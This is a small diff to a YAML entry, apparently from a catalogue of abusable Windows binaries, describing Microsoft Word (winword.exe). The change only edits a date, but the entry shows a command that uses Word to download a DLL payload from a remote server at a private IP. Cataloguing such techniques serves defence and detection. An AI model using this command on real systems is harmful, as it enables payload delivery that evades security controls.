@@ -2,7 +2,7 @@
 Name: Winword.exe
 Description: Microsoft Office binary
 Author: 'Reegun J (OCBC Bank)'
-Created: '2019-07-19'
+Created: 2019-07-19
 Commands:
   - Command: winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
     Description: Downloads payload from remote server
